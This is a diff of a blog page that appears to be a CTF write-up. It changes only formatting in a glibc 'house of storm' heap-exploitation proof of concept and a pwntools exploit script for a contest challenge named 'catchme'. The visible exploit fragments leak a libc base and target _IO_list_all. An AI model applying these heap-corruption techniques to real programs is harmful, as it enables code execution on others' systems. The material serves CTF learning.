@@ -211,7 +211,7 @@
                 
                 <span class="tag">
                     
-                    <a href="/tags/Pwn/" style="color: #ffa2c4">
+                    <a href="/tags/Pwn/" style="color: #ff7d73">
                         Pwn
                     </a>
                 </span>
@@ -229,7 +229,7 @@
     
     <div class="content" v-pre>
         <p>poc：</p>
-<pre><code class="c">// gcc -ggdb -fpie -pie -o house_of_storm house_of_storm.c
+<pre><code class="language-c">// gcc -ggdb -fpie -pie -o house_of_storm house_of_storm.c
 // run: GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./house_of_storm
 #include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
@@ -271,12 +271,12 @@ int main(void)
 </code></pre>
 <p>2.27版本需要先填满tcache</p>
 <p>题目：2026国赛半决辽宁赛区 catchme</p>
-<pre><code class="python">#!/usr/bin/env python3
+<pre><code class="language-python">#!/usr/bin/env python3
 
-&#39;&#39;&#39;
+'''
     author: Yoisaki_Kanade
     time: 2026-03-22 09:52:52
-&#39;&#39;&#39;
+'''
 from pwncli import *
 from pwnlib.args import free_form
 
@@ -291,17 +291,17 @@ proc_name = &quot;&quot;
 elf = context.binary = ELF(filename)
 if libcname:
     libc = ELF(libcname)
-gs = &#39;&#39;&#39;
+gs = '''
 decompiler connect ida --host 127.0.0.1 --port 3662
 # b * 0x00007ffff78949ff
 set debuginfod enabled on
 set debug-file-directory /home/yoisaki_kanade/.config/kpwn/pkgs/2.27-3ubuntu1.6/amd64/libc6-dbg_2.27-3ubuntu1.6_amd64/usr/lib/debug
 set directories /home/yoisaki_kanade/.config/kpwn/pkgs/2.27-3ubuntu1.6/amd64/glibc-source_2.27-3ubuntu1.6_all/usr/src/glibc/glibc-2.27
 c
-&#39;&#39;&#39;
-context.log_level = &#39;debug&#39;
-context.terminal =[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-context.arch = &#39;amd64&#39;
+'''
+context.log_level = 'debug'
+context.terminal =['tmux','splitw','-h']
+context.arch = 'amd64'
 # b *0x7ffff789a0cc
 def start():
     if args.GDB:
@@ -322,28 +322,28 @@ def pwn():
     sl = lambda x : p.sendline(x)
     itob = lambda x : str(x).encode()
     su = lambda x : p.success(x)
-    u64_ex = lambda x : u64(x.ljust(8,b&#39;\0&#39;))
+    u64_ex = lambda x : u64(x.ljust(8,b'\0'))
     def cmd(s):
         sla(&quot;&gt;&gt;&quot;,s)
     def insert(i):
-        cmd(b&#39;1&#39;)
+        cmd(b'1')
         sla(b&quot;choose your creature type&quot;,itob(i))
 
     def erase(i):
-        cmd(b&#39;2&#39;)
+        cmd(b'2')
         sla(&quot;index:&quot;,itob(i))
 
     def show(i):
-        cmd(b&#39;3&#39;)
+        cmd(b'3')
         sla(&quot;index:&quot;,itob(i))
 
-    def edit(i,c=&#39;\0&#39;):
-        cmd(b&#39;4&#39;)
+    def edit(i,c='\0'):
+        cmd(b'4')
         sla(&quot;index:&quot;,itob(i))
-        sa(b&#39;set tag:&#39;,c)
+        sa(b'set tag:',c)
 
     def full_del(i):
-        cmd(b&#39;6&#39;)
+        cmd(b'6')
         sla(&quot;index:&quot;,itob(i))
     pause()
     # Your exploit here
@@ -361,7 +361,7 @@ def pwn():
     full_del(2) #2 del gap pointer
     erase(1) # free large bin
     show(1) # leak
-    ru(b&#39;tag:&#39;)
+    ru(b'tag:')
     libc_base = u64_ex(r(6)) -0x3ebca0
     libc.address =libc_base
     _IO_list_all = libc.sym[&quot;_IO_list_all&quot;]
@@ -379,7 +379,7 @@ def pwn():
     full_del(0)
     # pause()
     insert(3)
-    ru(b&#39;\n(1)fox\n(2)hawk\n(3)otter\n&#39;)
+    ru(b'\n(1)fox\n(2)hawk\n(3)otter\n')
     result = r(0x6)
     print(result)
     if not args.GDB:
